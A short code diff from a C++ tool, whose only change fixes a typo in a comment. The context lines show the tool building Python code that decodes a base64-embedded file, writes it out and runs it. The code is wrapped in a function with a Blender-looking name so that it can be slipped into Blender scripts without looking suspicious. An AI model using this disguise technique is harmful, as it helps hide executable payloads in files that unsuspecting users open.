@@ -26,7 +26,7 @@ int main(int argc, char* argv[]) {
     
     // Generate some python code that decodes the base64 encoded input file, writes it to a file and executes it
     std::string pythonCode;
-    pythonCode += "def bl_get_generic_debug_conf():\n";  // This function name is so that I can smuggle it into blender python code and have it not look to suspicious as a function call
+    pythonCode += "def bl_get_generic_debug_conf():\n";  // This function name is so that I can smuggle it into blender python code and have it not look too suspicious as a function call
     pythonCode += "    import base64\n";
     pythonCode += "    import subprocess\n";
     pythonCode += "    b = b'" + base64_encode(data) + "'\n";
